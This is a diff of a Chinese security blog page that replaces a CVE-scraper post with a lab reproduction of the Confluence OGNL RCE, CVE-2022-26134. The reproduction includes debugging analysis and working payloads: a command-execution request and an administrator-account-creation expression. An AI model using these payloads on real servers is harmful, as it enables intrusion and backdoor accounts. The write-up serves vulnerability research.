@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="utf-8">
-  <title>获取每天新的CVE | 九世的博客</title>
-  <meta name="keywords" content=" Writing ">
-  <meta name="description" content="获取每天新的CVE | 九世的博客">
+  <title>CVE-2022-26134 Confluence OGNL RCE 漏洞复现 | 九世的博客</title>
+  <meta name="keywords" content=" 代码审计 ">
+  <meta name="description" content="CVE-2022-26134 Confluence OGNL RCE 漏洞复现 | 九世的博客">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="Become a hacker">
 <meta property="og:type" content="website">
@@ -1962,9 +1962,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-获取每天新的CVE" class="article article-type-post" itemscope="" itemprop="blogPost">
+        <article id="post-CVE-2022-26134-Confluence-OGNL-RCE-漏洞复现" class="article article-type-post" itemscope="" itemprop="blogPost">
     
-        <h1 class="article-title">获取每天新的CVE</h1>
+        <h1 class="article-title">CVE-2022-26134 Confluence OGNL RCE 漏洞复现</h1>
     
     <div class="article-meta">
         
@@ -1973,14 +1973,14 @@
         
         <span class="tag">
             
-            <a href="javascript:" class="color3">Writing</a>
+            <a href="javascript:" class="color5">代码审计</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title="更新时间: 2019-04-19 20:38:53">2019-04-14 12:14</time>
+        创建时间:<time class="date" title="更新时间: 2022-08-13 00:31:03">2022-08-13 00:12</time>
         
     </div>
     <div class="article-meta">
@@ -2002,7 +2002,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#正文"><span class="toc-text">正文</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞范围"><span class="toc-text">漏洞范围</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#环境搭建"><span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#动态调试过程"><span class="toc-text">动态调试过程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#payload刨析"><span class="toc-text">payload刨析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考链接"><span class="toc-text">参考链接</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -2017,94 +2017,63 @@
 </div>
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>今天看RSS的时候发现有篇文章说到抓取某接口获取每天新的CVE然后保存到数据库并通过邮箱告知CVE更新了。由于个人觉得不错索性就进行爬了<br><img src="https://s2.ax1x.com/2019/04/14/AOdKlF.md.png" alt=""></p>
-<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>接口是<br><a href="https://cassandra.cerias.purdue.edu/CVE_changes/today.html" target="_blank" rel="noopener">CVE接口</a><br><img src="https://s2.ax1x.com/2019/04/14/AOd8T1.png" alt="AOd8T1.png"></p>
-<p>都是超链接，点进去可以看到详情，直接爬就完事了,由于最近学了异步追求速度<br>思路如下：</p>
-<pre><code>1.抓取接口里url
-2.异步获取全部详情的url
-3.写入到xls
-</code></pre><p>代码如下：</p>
-<pre><code class="python">#author:九世
-#time:2019/4/14
+        <h2 id="漏洞范围"><a href="#漏洞范围" class="headerlink" title="漏洞范围"></a>漏洞范围</h2><p>Confluence Server and Data Center &gt;= 1.3.0<br>Confluence Server and Data Center &lt; 7.4.17<br>Confluence Server and Data Center &lt; 7.13.7<br>Confluence Server and Data Center &lt; 7.14.3<br>Confluence Server and Data Center &lt; 7.15.2<br>Confluence Server and Data Center &lt; 7.16.4<br>Confluence Server and Data Center &lt; 7.17.4<br>Confluence Server and Data Center &lt; 7.18.1</p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>docker环境</p>
+<pre><code>docker-compose.yml
 
-import requests
-from bs4 import BeautifulSoup
-import asyncio
-from aiohttp import ClientSession
-import re
-import xlwt
-import time
-import os
-
-new_cve=[]
-bh_cve=[]
-jg_cve=[]
-
-class Demon:
-    def __init__(self,headers,url):
-        self.headers=headers
-        self.url=url
-
-    def zx(self):
-        try:
-            rgt=requests.get(url=self.url,headers=headers,timeout=3)
-            zg=BeautifulSoup(rgt.text,&#39;html.parser&#39;)
-            for c in zg.find_all(&#39;a&#39;):
-                href=c.get(&#39;href&#39;)
-                new_cve.append(href)
-        except Exception as r:
-            print(&#39;[-] Error {}&#39;.format(r))
-
-
-    async def zhuaqu(self,url):
-        async with ClientSession() as reqt:
-            try:
-                async with reqt.get(url=url,headers=self.headers,timeout=2) as respone:
-                    url=respone.url
-                    jg_cve.append(url)
-                    zz=re.findall(&#39;[0-9]{1,}-.*&#39;,str(url))
-                    bh_cve.append(&#39;CVE-{}&#39;.format(zz[0]))
-
-            except:
-                pass
-
-    def writes(self):
-        workbook=xlwt.Workbook(encoding=&#39;utf-8&#39;)
-        sheet=workbook.add_sheet(&quot;今天更新的CVE&quot;)
-        sheet.write(0,0,&quot;CVE编号&quot;)
-        sheet.write(0,1,&quot;URL&quot;)
-        for i in range(0,len(bh_cve)):
-            sheet.write(int(i)+1,0,bh_cve[i])
-            sheet.write(int(i)+1,1,&#39;{}&#39;.format(jg_cve[i]))
-
-        sz=time.time()
-        workbook.save(&#39;{}.xls&#39;.format(sz))
-        if os.path.exists(&#39;{}.xls&#39;.format(sz)):
-            print(&#39;[+] 保存成功&#39;)
-        else:
-            print(&#39;[-] 保存失败&#39;)
-
-    async def main(self):
-        td=[]
-        for n in new_cve:
-            jc=asyncio.ensure_future(self.zhuaqu(n))
-            td.append(jc)
-
-        await asyncio.wait(td)
-
-
-if __name__ == &#39;__main__&#39;:
-    headers={&#39;user-agent&#39;:&#39;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36&#39;}
-    urls=&#39;https://cassandra.cerias.purdue.edu/CVE_changes/today.html&#39;
-    obj=Demon(headers=headers,url=urls)
-    obj.zx()
-    loop = asyncio.get_event_loop()
-    loop.run_until_complete(obj.main())
-    loop.close()
-    obj.writes()
-</code></pre>
-<p>最终结果：<br><img src="https://s2.ax1x.com/2019/04/14/AOdKlF.md.png" alt=""></p>
-<p>仓库地址：<a href="https://github.com/422926799/python/tree/master/CVE%E5%AE%9A%E6%97%B6%E6%9B%B4%E6%96%B0" target="_blank" rel="noopener">https://github.com/422926799/python/tree/master/CVE%E5%AE%9A%E6%97%B6%E6%9B%B4%E6%96%B0</a></p>
+version: &#39;2&#39;
+services:
+  web:
+    image: vulhub/confluence:7.13.6
+    ports:
+      - &quot;8090:8090&quot;
+      - &quot;5050:5050&quot;
+    depends_on:
+      - db
+  db:
+    image: postgres:12.8-alpine
+    environment:
+    - POSTGRES_PASSWORD=postgres
+    - POSTGRES_DB=confluence
+</code></pre><p>docker搭好后<br><img src="https://s1.ax1x.com/2022/08/13/vY5EOU.png" alt=""></p>
+<p>搭建好之后还需要去注册账号获取临时KEY来激活<br>参考链接：<a href="https://www.modb.pro/db/431731" target="_blank" rel="noopener">https://www.modb.pro/db/431731</a></p>
+<p>安装过程<br><img src="https://s1.ax1x.com/2022/08/13/vY5KYR.png" alt=""></p>
+<p>安装成功后<br><img src="https://s1.ax1x.com/2022/08/13/vY52kj.png" alt=""></p>
+<p>在容器中/opt/atlassian/confluence/bin目录下修改setenv.sh文件，加入远程调试配置。</p>
+<pre><code>CATALINA_OPTS=&quot;-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=*:5050 ${CATALINA_OPTS}&quot;
+</code></pre><p><img src="https://s1.ax1x.com/2022/08/13/vY5Whn.png" alt=""></p>
+<p>进入容器后将/opt/atlassian目录下的confluence源码使用docker cp命令复制到本地。<br>使用IDEA将/confluence/WEB-INF下的atlassian-bundled-plugins、atlassian-bundled-plugins-setup、lib文件拉取为依赖文件<br><img src="https://s1.ax1x.com/2022/08/13/vY5410.png" alt=""></p>
+<p>idea远程调试设置<br><img src="https://s1.ax1x.com/2022/08/13/vY55cV.png" alt=""></p>
+<p>之后在com/opensymphony/webwork/dispatcher/ServletDispatcher.class第85行下断点(service函数)<br><img src="https://s1.ax1x.com/2022/08/13/vY5TnU.png" alt=""></p>
+<p>为什么在ServletDispatcher下断点？运维所有的.action最后的servlet指向了，com.atlassian.confluence.servlet.ConfluenceServletDispatcher类，而ConfluenceServletDispatcher继承了ServletDispatcher<br><img src="https://s1.ax1x.com/2022/08/13/vY5qAJ.png" alt=""></p>
+<p><img src="https://s1.ax1x.com/2022/08/13/vY5v1x.png" alt=""></p>
+<h2 id="动态调试过程"><a href="#动态调试过程" class="headerlink" title="动态调试过程"></a>动态调试过程</h2><p>1.com/opensymphony/webwork/dispatcher/ServletDispatcher调用com/atlassian/confluence/servlet/ConfluenceServletDispatcher.classserviceAction函数<br><img src="https://s1.ax1x.com/2022/08/13/vY5zjK.png" alt=""></p>
+<p>2.创建一个hash表把传进的全部作为hash表默认值，变量名为extraContext<br>3.put变量名为com.opensymphony.xwork.dispatcher.ServletDispatcher，值是自身对象<br>4.调用DefaultActionProxy里的createActionProxy传入namespace，actionName,extraContext 变量名为proxy<br>5.调用proxy的execute函数<br><img src="https://s1.ax1x.com/2022/08/13/vYICHe.png" alt=""><br><img src="https://s1.ax1x.com/2022/08/13/vYIFNd.png" alt=""></p>
+<p>DefaultActionProxy里的execute函数<br>1.获取ActionContext对象实例 （DefaultActioninvocation）<br>2.调用该对象的invoke函数<br><img src="https://s1.ax1x.com/2022/08/13/vYIk4A.png" alt=""></p>
+<p>DefaultActioninvocation invoke函数<br>1.遍历this.interceptors.hasNext() hash表 （该hash表存着所有类对象）<br>2.当resultCode为notpermitted时，退出循环<br><img src="https://s1.ax1x.com/2022/08/13/vYIZgP.png" alt=""></p>
+<p>6.进入到ActionChainResult类里的execute函数<br>7.this.namespace为我们传入的payload<br>8.OgnlValueStack stack变量获取OgnlValueStack对象<br>9.将stack和this.namespace传入TextParseUtil.translateVariables函数<br><img src="https://s1.ax1x.com/2022/08/13/vYI14s.png" alt=""></p>
+<p>translateVariables函数<br>1.正则提取ONGL表达式<br>2.调用OgnlValueStack.findValue函数传入ONGL表达式 复制变量object o<br>3.执行完后返回内容<br><img src="https://s1.ax1x.com/2022/08/13/vYI8Cn.png" alt=""></p>
+<p>OgnlValueStack.findValue函数<br>最后调用findValue函数对表达式进行解析<br><img src="https://s1.ax1x.com/2022/08/13/vYIJg0.png" alt=""><br>(不知道是不是远程调试的问题，这里断点o没返回执行命令的结果，文章里有）<br><img src="https://s1.ax1x.com/2022/08/13/vYIwE4.png" alt=""></p>
+<h2 id="payload刨析"><a href="#payload刨析" class="headerlink" title="payload刨析"></a>payload刨析</h2><pre><code>GET //%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/ HTTP/1.1
+Host: 192.168.3.88:8090
+Cache-Control: max-age=0
+DNT: 1
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: JSESSIONID=EA0CD27EDE8E10DD40A744E51514CB5F
+Connection: close
+</code></pre><p><img src="https://s1.ax1x.com/2022/08/13/vYIygx.png" alt=""></p>
+<p>payload刨析<br>1.定义a变量调用Runtime.exec执行命令<br>2.将执行命令结果设置到返回头X-Cmd-Response</p>
+<pre><code>//${(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&quot;id&quot;).getInputStream(),&quot;utf-8&quot;)).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader(&quot;X-Cmd-Response&quot;,#a))}/
+</code></pre><p>出处Y4er的博客 <a href="https://y4er.com/post/cve-2022-26134-confluence-server-data-center-ognl-rce/" target="_blank" rel="noopener">https://y4er.com/post/cve-2022-26134-confluence-server-data-center-ognl-rce/</a><br>添加用户的payload</p>
+<pre><code>${#this.getUserAccessor().addUser(&#39;test&#39;,&#39;test@1234&#39;,&#39;test@gmail.com&#39;,&#39;Test&#39;,@com.atlassian.confluence.util.GeneralUtil@splitCommaDelimitedString(&quot;confluence-administrators,confluence-users&quot;))}
+</code></pre><p>设置cookie payload</p>
+<pre><code>${@com.atlassian.confluence.util.GeneralUtil@setCookie(&quot;key&quot;,&quot;value&quot;)}
+</code></pre><p>EXP<br><a href="https://github.com/Nwqda/CVE-2022-26134" target="_blank" rel="noopener">https://github.com/Nwqda/CVE-2022-26134</a><br><a href="https://github.com/BeichenDream/CVE-2022-26134-Godzilla-MEMSHELL" target="_blank" rel="noopener">https://github.com/BeichenDream/CVE-2022-26134-Godzilla-MEMSHELL</a></p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.freebuf.com/vuls/335624.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/335624.html</a><br><a href="https://y4er.com/post/cve-2022-26134-confluence-server-data-center-ognl-rce/" target="_blank" rel="noopener">https://y4er.com/post/cve-2022-26134-confluence-server-data-center-ognl-rce/</a></p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
@@ -2114,12 +2083,12 @@ if __name__ == &#39;__main__&#39;:
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>获取每天新的CVE</p>
+    <p><span class="copy-title">文章标题:</span>CVE-2022-26134 Confluence OGNL RCE 漏洞复现</p>
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="九世">九世</a></p>
-    <p><span class="copy-title">发布时间:</span>2019-04-14, 12:14:01</p>
-    <p><span class="copy-title">最后更新:</span>2019-04-19, 20:38:53</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/5674cd5.html" title="获取每天新的CVE">http://422926799.github.io/posts/5674cd5.html</a>
+    <p><span class="copy-title">发布时间:</span>2022-08-13, 00:12:54</p>
+    <p><span class="copy-title">最后更新:</span>2022-08-13, 00:31:03</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/9c6a5f14.html" title="CVE-2022-26134 Confluence OGNL RCE 漏洞复现">http://422926799.github.io/posts/9c6a5f14.html</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
